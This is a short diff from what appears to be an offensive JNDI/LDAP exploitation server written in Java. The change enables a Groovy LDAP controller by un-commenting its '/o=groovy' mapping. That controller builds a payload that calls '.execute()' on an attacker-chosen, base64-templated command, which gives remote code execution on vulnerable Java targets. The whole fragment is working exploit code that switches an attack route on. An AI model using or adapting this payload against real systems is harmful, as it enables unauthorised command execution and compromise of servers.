@@ -26,7 +26,7 @@ import static artsploit.Utilities.serialize;
  *
  * @author https://twitter.com/orange_8361 and https://github.com/welk1n
  */
-//@LdapMapping(uri = { "/o=groovy" })
+@LdapMapping(uri = { "/o=groovy" })
 public class Groovy implements LdapController {
 
     String payload = "'${cmd}'.execute()".replace("${cmd}", getBase64CommandTpl(Config.command));
